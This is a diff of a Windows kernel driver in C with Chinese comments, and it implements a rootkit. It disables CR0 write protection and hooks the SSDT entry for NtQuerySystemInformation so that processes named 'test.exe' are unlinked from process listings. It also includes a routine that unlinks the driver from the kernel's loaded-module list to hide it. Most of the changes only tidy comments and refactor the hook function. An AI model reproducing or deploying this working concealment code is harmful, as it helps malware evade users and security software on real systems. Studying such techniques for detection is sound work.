@@ -43,7 +43,7 @@ typedef struct _SYSTEM_PROCESS_INFO {
 	LARGE_INTEGER KernelTime;
 	UNICODE_STRING ProcessName;//进程的文件名
 	KPRIORITY BasePriority;
-	HANDLE UniqueProceessId;
+	HANDLE UniqueProceessId;//pid
 	PVOID Reserved3;
 	ULONG HandleCount;
 	BYTE  Reserved4[4];
@@ -54,8 +54,7 @@ typedef struct _SYSTEM_PROCESS_INFO {
 }SYSTEM_PROCESS_INFO,*PSYSTEM_PROCESS_INFO;
 
 
-//判断是否该隐藏此进程  1表示需要隐藏  0 表示不需要隐藏
-//可添加隐藏进程
+//判断是否该隐藏此进程
 int shouldHide(PSYSTEM_PROCESS_INFO systeminfo) {
 	//通过名称进行判断
 	if (NULL != wcsstr((*systeminfo).ProcessName.Buffer, L"test.exe"))
@@ -98,11 +97,11 @@ NTSTATUS newNtQuerySystemInformation(
 				if (pSPI != NULL) {
 					//当前进程是最后一个
 					if ((*cSPI).NextEntryOffset == 0) {
-						//把他的前一个的后向指针置零  脱链
+						//把前一个的后向偏移置零 终止
 						(*pSPI).NextEntryOffset = 0;
 					}
 					else {
-						//前一个的后向指针偏移修正
+						//前一个的后向偏移修正
 						(*pSPI).NextEntryOffset = (*pSPI).NextEntryOffset + (*cSPI).NextEntryOffset;
 					}
 				}
@@ -110,13 +109,13 @@ NTSTATUS newNtQuerySystemInformation(
 					if ((*cSPI).NextEntryOffset == 0) {//只有一个进程
 						SystemInformation = NULL;
 					}
-					else {//第一个进程但不是最后一个进程,将SystemInformation修正
+					else {//不是最后一个进程,修正SystemInformation
 						(BYTE*)SystemInformation = ((BYTE*)SystemInformation) + (*cSPI).NextEntryOffset;
 					}
 				}
 			}
 		}
-		//继续处理遍历下一个进程结构体信息
+		//遍历
 		pSPI = cSPI;
 		if ((*cSPI).NextEntryOffset != 0) {
 			(BYTE*)cSPI = ((BYTE*)cSPI) + (*cSPI).NextEntryOffset;
@@ -145,7 +144,6 @@ typedef struct ServiceDescriptorTable {
 
 //通过更改cr0寄存器的WP位来开启或者关闭写保护
 VOID disableWP_cr0() {
-	//0xfffeffff  -> 11111111 11111110 11111111 11111111
 	__asm {
 		PUSH EBX
 		MOV EBX,cr0
@@ -170,8 +168,7 @@ VOID enableWP_cr0() {
 }
 
 
-
-// 内存映射此dll文件
+// 映射dll文件至内存
 NTSTATUS DllFileMap(UNICODE_STRING ustrDllFileName, HANDLE* phFile, HANDLE* phSection, PVOID* ppBaseAddress)
 {
 	NTSTATUS status = STATUS_SUCCESS;
@@ -190,7 +187,7 @@ NTSTATUS DllFileMap(UNICODE_STRING ustrDllFileName, HANDLE* phFile, HANDLE* phSe
 		DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "ZwOpenFile Error! [error code: 0x%X]", status);
 		return status;
 	}
-	// 创建一个节对象, 以 PE 结构中的 SectionALignment 大小对齐映射文件
+	// 创建一个节, 以SectionALignment对齐映射文件
 	status = ZwCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, 0, PAGE_READWRITE, 0x1000000, hFile);
 	if (!NT_SUCCESS(status))
 	{
@@ -216,8 +213,7 @@ NTSTATUS DllFileMap(UNICODE_STRING ustrDllFileName, HANDLE* phFile, HANDLE* phSe
 	return status;
 }
 
-//从导出表获取索引
-// 根据导出表获取导出函数地址, 从而获取 SSDT 函数索引号
+// 根据导出表获取导出函数地址,从函数头部获取 SSDT 函数索引号
 ULONG GetIndexFromExportTable(PVOID pBaseAddress, PCHAR pszFunctionName)
 {
 	ULONG ulFunctionIndex = 0;
@@ -239,6 +235,7 @@ ULONG GetIndexFromExportTable(PVOID pBaseAddress, PCHAR pszFunctionName)
 		// 判断是否是要查询的函数
 		if (0 == _strnicmp(pszFunctionName, lpName, strlen(pszFunctionName)))
 		{
+			//32位上导出函数以"mov eax ,ssdt_index"开始   64位是  "mov r10,rcx;mov eax,ssdt_index"  
 			// 获取导出函数地址
 			USHORT uHint = *(USHORT*)((PUCHAR)pDosHeader + pExportTable->AddressOfNameOrdinals + 2 * i);
 			ULONG ulFuncAddr = *(PULONG)((PUCHAR)pDosHeader + pExportTable->AddressOfFunctions + 4 * uHint);
@@ -272,7 +269,7 @@ ULONG GetSSDTFunctionIndex(UNICODE_STRING ustrDllFileName, PCHAR pszFunctionName
 	// 根据导出表获取 SSDT 函数索引号
 	ulFunctionIndex = GetIndexFromExportTable(pBaseAddress, pszFunctionName);
 
-	// free
+	// 释放
 	ZwUnmapViewOfSection(NtCurrentProcess(), pBaseAddress);
 	ZwClose(hSection);
 	ZwClose(hFile);
@@ -281,23 +278,19 @@ ULONG GetSSDTFunctionIndex(UNICODE_STRING ustrDllFileName, PCHAR pszFunctionName
 }
 
 
-//  hook SSDT对应项
-BYTE* hookSSDT(ULONG index,BYTE* newAddr,DWORD *callTable) {
+//hook SSDT修改对应项
+VOID hookSSDT(ULONG index,BYTE* newAddr,DWORD *callTable) {
 	PLONG target;
 	target = (PLONG) & (callTable[index]);
-	return ((BYTE*)InterlockedExchange(target, (LONG)newAddr));
+	//原子交换
+	InterlockedExchange(target, (LONG)newAddr);
 }
 
-VOID unhookSSDT(ULONG index,BYTE* oldAddr,DWORD* callTable) {
-	PLONG target;
-	target = (PLONG) & (callTable[index]);
-	InterlockedExchange(target, (LONG)oldAddr);
-}
 
 /*************************************
  *   隐藏驱动程序
  *************************************/
-//Driver_section结构
+//Driver_section
 typedef struct _LDR_DATA_TABLE_ENTRY
 {
 	LIST_ENTRY InLoadOrderLinks;
@@ -345,7 +338,7 @@ void HideDriver(IN PDRIVER_OBJECT DriverObject) {
 	//双链表节点脱链
 	pre_section->InLoadOrderLinks.Flink = cur_section->InLoadOrderLinks.Flink;
 	next_section->InLoadOrderLinks.Blink = cur_section->InLoadOrderLinks.Blink;
-	//自循环
+
 	cur_section->InLoadOrderLinks.Flink = (PLIST_ENTRY)cur_section;
 	cur_section->InLoadOrderLinks.Blink = (PLIST_ENTRY)cur_section;
 	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "hide driver .\n");
@@ -358,7 +351,7 @@ VOID Unload(IN PDRIVER_OBJECT DriverObject) {
 	//KdBreakPoint();
 	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver unLoaded.\n");
 	disableWP_cr0();
-	unhookSSDT(ulSSDTFunctionIndex, oldNtQuerySystemInformation, SSDTcallTable);
+	hookSSDT(ulSSDTFunctionIndex, oldNtQuerySystemInformation, SSDTcallTable);
 	enableWP_cr0();
 	return;
 }
@@ -373,7 +366,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING regPath)
 	__declspec(dllimport) SDE KeServiceDescriptorTable;
 	SSDTcallTable = KeServiceDescriptorTable.KiServiceTable;
 
-	//获取函数对应的索引
+	//获取函数的ssdt索引
 	UNICODE_STRING ustrDllFileName;
 	RtlInitUnicodeString(&ustrDllFileName, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
 	//ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, "ZwQuerySystemInformation");
@@ -388,14 +381,13 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING regPath)
 		return STATUS_SUCCESS;
 	}
 
-	//修改内核对象DriverObject的DRIVER_SECTION
-	//将其从双链表上摘除以隐藏驱动自身
+	//隐藏驱动自身
 	//HideDriver(DriverObject);
 
 	KdBreakPoint();
 
 	disableWP_cr0();
-	//oldZwQuerySystemInformation = hookSSDT(ulSSDTFunctionIndex, newZwQuerySystemInformation, SSDTcallTable);
+	
 	hookSSDT(ulSSDTFunctionIndex, newNtQuerySystemInformation, SSDTcallTable);
 	enableWP_cr0();
 	KdBreakPoint();
